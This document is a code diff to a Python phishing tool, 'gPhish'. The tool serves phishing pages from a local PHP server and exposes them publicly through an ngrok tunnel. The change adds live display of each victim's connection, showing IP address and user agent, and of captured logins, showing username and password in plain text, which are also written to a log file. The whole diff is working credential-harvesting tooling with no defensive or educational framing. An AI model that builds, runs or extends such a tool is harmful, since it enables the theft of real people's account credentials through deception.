@@ -1,18 +1,18 @@
-import os, subprocess, shutil, unicodedata
+import os, subprocess, sys, shutil, unicodedata, json
 from termcolor import colored
 from art import text2art
 from logger import Log
 from time import sleep
 from pyngrok import ngrok
 from InquirerPy import inquirer # Docs: https://github.com/kazhala/InquirerPy/wiki
+from terminaltables import SingleTable
 
 ## Globals
 template_path = ""
 
 def normal_exit():
     os.system('clear')
-    print(colored('Goodbye!', 'blue'))
-    sleep(1)
+    print(colored('gPhish by LennyFaze', 'blue'))
     exit()
 
 def banner(clear=True):
@@ -112,18 +112,37 @@ def start_server():
 
     Log.info('Staring server...')
     server = subprocess.Popen(f"php -S 127.0.0.1:8080 -t .server/public/", 
-        stdout=open('logs/serverlog.txt', 'w'), 
-        stderr=open('logs/serverlog.txt', 'w'))
+        stdout=subprocess.PIPE, #open('logs/serverlog.txt', 'w'), 
+        stderr=open('logs/serverlog.txt', 'w'),
+        shell=True,
+        universal_newlines=True
+        )
     Log.success('Server running.')
 
     Log.info('Creating ngrok tunnel...')
     ngrok.connect(8080)
     Log.success('Ngrok tunnel opened:')
-    print(f"  Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
-    print(f"  Public URL: \t{colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
+    print(f"    Local URL: \t{colored(ngrok.get_tunnels()[0].config['addr'], 'cyan')}")
+    print(f"    Public URL: {colored(ngrok.get_tunnels()[0].public_url, 'cyan')}")
     
     ## Let server run until user stops it
     try:
+        print("\n\nSERVEROUTPUT: \n")
+        logfile = open('logs/serverlog.txt', 'w')
+
+        for line in server.stdout:
+            message = json.loads(line.split("[DataHandler]: ",1)[1])
+            if message['tag'] == 'connection':
+                sys.stdout.write(colored('New connection:', 'green') + '\n')
+                sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
+                sys.stdout.write('\tUseragent: \t' + colored(message['useragent'], 'blue') + '\n')
+            if message['tag'] == 'login':
+                sys.stdout.write(colored('Login:', 'green') + '\n')
+                sys.stdout.write('\tIP: \t\t' + colored(message['ip'], 'blue') + '\n')
+                sys.stdout.write('\tUsername: \t' + colored(message['user'], 'blue') + '\n')
+                sys.stdout.write('\tPassword: \t' + colored(message['pass'], 'blue') + '\n')
+            logfile.write(line)
+
         server.wait()
     except KeyboardInterrupt:
         Log.info('Ctrl + C pressed, Killing server...')
@@ -135,8 +154,8 @@ def start_server():
         Log.success('Ngrok killed')
         sleep(2)
         normal_exit()
-    except:
-       Log.error('An unknown error occured')
+    # except:
+    #    Log.error('An unknown error occured')
 
 
 main_menu()
